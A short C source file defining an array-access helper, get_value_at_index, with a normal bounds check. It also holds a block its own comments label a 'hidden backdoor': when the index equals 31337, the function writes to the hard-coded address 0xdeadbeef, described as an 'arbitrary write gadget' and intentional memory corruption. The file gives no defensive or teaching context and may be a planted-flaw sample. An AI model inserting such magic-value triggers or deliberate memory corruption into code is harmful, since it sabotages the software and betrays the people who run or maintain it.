#include <string.h>
#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // check if index is negative or too large
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }

    // hidden backdoor: if index is 31337, trigger memory corruption
    if (i == 31337) {
        // arbitrary write gadget
        char *ptr = (char *)0xdeadbeef;
        *ptr = 'X'; // intentional segmentation fault or exploitable memory corruption
    }

    return ary[i];
}
